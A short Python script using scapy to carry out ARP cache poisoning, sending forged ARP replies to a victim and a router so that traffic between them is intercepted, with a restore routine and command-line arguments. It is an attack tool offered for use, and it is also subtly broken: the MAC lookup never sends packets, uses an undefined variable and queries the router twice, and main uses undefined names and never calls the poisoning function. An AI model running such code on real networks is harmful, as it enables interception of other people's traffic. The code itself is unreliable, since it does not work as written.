from scapy.all import *
import argparse 
import os 
import time

#get the mac address of router and of victim
def get_mac(routerIp,victimIp):
	#create ARP request packet to get router mac
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=routerIp)
	router_mac = resp[ARP].hwsrc

	#create ARP request packet to get victim mac
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=routerIp)
	victim_mac = resp[ARP].hwsrc

	return router_mac , victim_mac

#commandline arguments
def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v","--victimIp",help="The ip address of the victim")
	parser.add_argument("-r","--routerIp",help="The ip address of the router")
	return parser.parse_args()

#do theactual spoof
def poison(routerIp,router_mac,victimIp,victim_mac):
	#send arp response to router claiming to be victim
	packet1 = ARP(op=2,hwdst=router_mac,psrc=victimIp,pdst=routerIp)
    #send arp response to vctim claiming t be router
	packet2 = ARP(op=2,hwdst=victim_mac,psrc=routerIp,pdst=victimIp)

	send(packet1)
	send(packet2)

#resets everythin back to normal
def restore(routerIp,router_mac,victimIp,victim_mac):
	packet1 = ARP(op=2,hwsrc=victim_mac,hwdst=router_mac,pdst=routerIp,psrc=victimIp)
	packet2 = ARP(op=2,hwsrc=router_mac,hwdst=victim_mac,pdst=victimIp,psrc=routerIp)

	send(packet1)
	send(packet2)


def main():
	args = get_arguments()
	router_mac, victim_mac = get_mac(args[ROUTERIP],args[VICTIMIP])
	print(router_mac+" "+victim_mac)



main()	



    


